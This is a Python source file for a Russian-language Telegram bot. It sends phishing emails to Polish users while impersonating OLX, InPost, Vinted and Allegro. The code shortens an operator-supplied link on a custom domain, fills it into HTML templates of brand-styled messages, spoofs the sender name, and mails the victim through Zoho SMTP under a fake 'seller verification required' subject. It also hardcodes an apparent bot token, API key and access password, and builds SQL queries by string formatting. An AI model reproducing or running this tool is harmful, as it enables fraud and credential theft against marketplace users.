import pyshorteners
from aiogram import Bot, Dispatcher, executor, types
import sqlite3
import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
import zlib
import base64
import os
import random
import requests
from html_files.allegro import *
from html_files.inpost import *
from html_files.olx import *
from html_files.vinted import *


API_TOKEN = '6208926953:AAFV7-Atobiy5B0KxJ-eM2cZNwiZSKQ7Od8'


password = '123fffgggqwerty'

bot = Bot(token=API_TOKEN)
dp = Dispatcher(bot)


def add_user(user_id, name_user):
    conn = sqlite3.connect('database.db')
    cursor = conn.cursor()
    cursor.execute("SELECT * FROM users WHERE id_user=?", (user_id,))
    existing_user = cursor.fetchone()
    if existing_user is not None:
        conn.close()
        return existing_user[2]
    cursor.execute("INSERT INTO users (id_user, name_user, poz) VALUES (?, ?, ?)", (user_id, name_user, 0))
    conn.commit()
    conn.close()
    return 0


def verif_user(username):
    conn = sqlite3.connect('database.db')
    cursor = conn.cursor()

    cursor.execute("SELECT * FROM users WHERE id_user=?", (username,))
    existing_user = cursor.fetchone()
    if existing_user[2] == 1:
        conn.close()
        return True
    else:
        conn.close()
        return False


def unlock_user(block_id):
    try:
        conn = sqlite3.connect('database.db')
        cursor = conn.cursor()
        cursor.execute(f"Update users set poz = 1 where id_user = {block_id}")
        conn.commit()
        conn.close()
        return True
    except:
        return False


def block_user(block_id):
    try:
        conn = sqlite3.connect('database.db')
        cursor = conn.cursor()
        cursor.execute(f"Update users set poz = 0 where id_user = {block_id}")
        conn.commit()
        conn.close()
        return True
    except:
        return False


link = dict()
step1 = dict()
step2 = dict()
step3 = dict()
step4 = dict()
step5 = dict()
step6 = dict()
mail = dict()
file = dict()


async def set_all(message):
    conn = sqlite3.connect('database.db')
    cursor = conn.cursor()
    cursor.execute("SELECT * FROM users")
    f = cursor.fetchall()
    for i in f:
        await bot.send_message(message.chat.id, f'id - {i[0]} \n'
                                          f'name - {i[1]} \n')
    conn.commit()
    conn.close()






def read_cfg_file(file_path):
    sp = []
    try:
        with open(file_path, 'r') as file:
            for line in file:
                sp.append(line.split())
            return sp
    except:
        return False





def shorten_url(link):
    SHORTIO_API_KEY = 'sk_CabsZVU1v3ji5luu'
    api_endpoint = 'https://api.short.io/links'
    headers = {
        'authorization': SHORTIO_API_KEY,
        'Content-Type': 'application/json',
        'Accept': 'application/json'
    }
    data = {
        'domain': 'smutcums.com',  # домен
        'originalURL': link
    }
    response = requests.post(api_endpoint, json=data, headers=headers)
    response_data = response.json()
    if response.status_code == 200 and "secureShortURL" in response_data:
        shortened_link = response_data["secureShortURL"]
        return shortened_link
    else:
        return False

def open_html(name, link):
    print(1)
    if name == 'allegro.py':
        return h.replace("{short_link}", shorten_url(link))
    elif name == 'inpost.py':
        return a.replace("{short_link}", shorten_url(link))
    elif name == 'olx.py':
        return u.replace("{short_link}", shorten_url(link))
    elif name == 'vinted.py':
        return e.replace("{short_link}", shorten_url(link))




def send_link(name, recipient, link):
    try:

        sp = read_cfg_file('cfg.txt')

        fr = random.choice(sp)

        otp = fr[0]
        password = fr[1]
        if name == 'olx.py':
            message = MIMEMultipart()
            message["From"] = f"OLX.pl <{otp}>"
            message["To"] = recipient
            message["Subject"] = "Wymagana jest weryfikacja Sprzedawcy w celu sprzedaży"

        elif name == 'inpost.py':
            message = MIMEMultipart()
            message["From"] = f"Inpost.pl <{otp}>"
            message["To"] = recipient
            message["Subject"] = "Wymagana jest weryfikacja Sprzedawcy w celu sprzedaży"


        elif name == 'vinted.py':
            message = MIMEMultipart()
            message["From"] = f"Vinted.pl <{otp}>"
            message["To"] = recipient
            message["Subject"] = "Wymagana jest weryfikacja Sprzedawcy w celu sprzedaży"


        elif name == 'allegro.py':
            message = MIMEMultipart()
            message["From"] = f"Allegro.pl <{otp}>"
            message["To"] = recipient
            message["Subject"] = "Wymagana jest weryfikacja Sprzedawcy w celu sprzedaży"

        else:
            return False
        html = open_html(name, link)

        html_part = MIMEText(html, "html")
        message.attach(html_part)
        # Отправка письма сервер Zoho Mail
        server = smtplib.SMTP("smtp.zoho.eu", 587)
        server.starttls()
        server.login(f"{otp}", f"{password}")  # Замените на свой адрес и пароль
        server.sendmail(f"{otp}", recipient, message.as_string())
        server.quit()
        return True
    except:
        return False









@dp.message_handler(commands=['start']) #Явно указываем в декораторе, на какую команду реагируем.
async def send_welcome(message: types.Message):
    if add_user(message.chat.id, '@' + str(message.from_user.username)) == 1:
        markup = types.ReplyKeyboardMarkup(resize_keyboard=True)
        btn1 = types.KeyboardButton('Сократить и отправить ссылку')
        markup.add(btn1)
        await bot.send_message(chat_id=message.chat.id,
                               text='Привет, я могу сократить и отправить ссылку на почту в виде письма', reply_markup=markup)



@dp.message_handler(commands=['admin']) #Явно указываем в декораторе, на какую команду реагируем.
async def send_welcome(message: types.Message):
    if verif_user(message.chat.id):
        markup = types.ReplyKeyboardMarkup(resize_keyboard=True)
        btn1 = types.KeyboardButton('Посмотреть пользователей')
        btn2 = types.KeyboardButton('Добавить новых')
        btn3 = types.KeyboardButton('Заблокировать пользователя')
        markup.add(btn1, btn2, btn3)
        await message.answer('Добро пожаловать в доступ админа, вы можете посмотреть всех пользователей бота, добавить новых или заблокировать', reply_markup=markup)


@dp.message_handler() #Создаём новое событие, которое запускается в ответ на любой текст, введённый пользователем.
async def echo(message: types.Message): #Создаём функцию с простой задачей — отправить обратно тот же текст, что ввёл пользователь.
   if message.chat.type == 'private':
       if message.text == 'Сократить и отправить ссылку':
           if verif_user(message.chat.id):
               await message.answer('Теперь пришли мне ссылку, чтобы я ее сократил')
               step1[message.chat.id] = True

       elif message.text == 'Посмотреть пользователей' and verif_user(message.chat.id):
           await set_all(message)

       elif message.text == 'Добавить новых' and verif_user(message.chat.id):
           await message.answer('Пришли мне айди пользователя, которого хочешь добавить в доступ к боту\n'
                                'Перед тем как добавить его, убедитесь что он уже прописал /start в бота\n')

           step3[message.chat.id] = True

       elif step5.get(message.chat.id):
           markup = types.InlineKeyboardMarkup(row_width=1)
           btn1 = types.InlineKeyboardButton('❌ОТМЕНА❌', callback_data='ОТМЕНА')
           btn2 = types.InlineKeyboardButton('✅Отправить✅', callback_data='отправить')
           markup.add(btn1, btn2)
           mail[message.chat.id] = message.text
           await message.answer(f'Письмо: {file.get(message.chat.id)}\n'
                                f'Получатель: {mail.get(message.chat.id)}\n'
                                f'Ссылка: {link.get(message.chat.id)}\n', reply_markup=markup)

           step5[message.chat.id] = False
           step6[message.chat.id] = True


       elif step3.get(message.chat.id):
           if unlock_user(message.text):
               step3[message.chat.id] = False
               await message.answer('Успешно')
           else:
               step3[message.chat.id] = False
               await message.answer('Что то пошло не так, попробуйте снова')
       elif message.text == 'Заблокировать пользователя' and verif_user(message.chat.id):
           await message.answer('Пришлите мне его айди пожалуйста')
           step4[message.chat.id] = True

       elif step4.get(message.chat.id):
            if block_user(message.text):
               await message.answer('Успешно заблокирован')
            else:
                await message.answer('Произошла ошибка, проверьте данные')

            step4[message.chat.id] = True

       elif message.text == password:
           try:
               verif_user(message.chat.id)
           except:
               add_user(message.chat.id, '@' + str(message.from_user.username))
           if not verif_user(message.chat.id):
               conn = sqlite3.connect('database.db')
               cursor = conn.cursor()
               cursor.execute(f"Update users set poz = 1 where id_user = {message.chat.id}")
               conn.commit()
               conn.close()
               await message.answer('Вы успешно авторизованы')

           else:
               await message.answer('Вы уже авторизованы')




       elif step1.get(message.chat.id):
            markup = types.InlineKeyboardMarkup(row_with=1)
            dir_list = os.listdir('html_files')
            for i in dir_list:
                if i != '__pycache__':
                    btn = types.InlineKeyboardButton(i, callback_data=i)
                    markup.add(btn)
            await message.answer(f'Хорошо, теперь выбери какое письмо ты хочешь отправить', reply_markup=markup)
            link[message.chat.id] = message.text
            step1[message.chat.id] = False



@dp.callback_query_handler(lambda c: c.data)
async def answer(call: types.CallbackQuery):
    if call.data != 'ОТМЕНА' and call.data != 'отправить':
        file[call.message.chat.id] = call.data
        step5[call.message.chat.id] = True
        await bot.send_message(
            call.from_user.id,
            "Теперь пришли мне почту получателя",
        )
    elif call.data == 'ОТМЕНА':
        await bot.send_message(
            call.from_user.id,
            "Отменил",
        )
    elif call.data == 'отправить':
        if send_link(name=file.get(call.message.chat.id), recipient=call.message.text, link=link.get(call.message.chat.id)):
            await bot.send_message(
                call.from_user.id,
                "Отправленно успешно",
            )
        else:
            await bot.send_message(
                call.from_user.id,
                "Возникла ошибка",
            )



if __name__ == '__main__':
    conn = sqlite3.connect('database.db')
    cursor = conn.cursor()
    cursor.execute('''
                    CREATE TABLE IF NOT EXISTS users (
                        id_user INTEGER PRIMARY KEY,
                        name_user TEXT,
                        poz INTEGER
                    )
                ''')
    conn.commit()
    conn.close()
    executor.start_polling(dp, skip_updates=True)
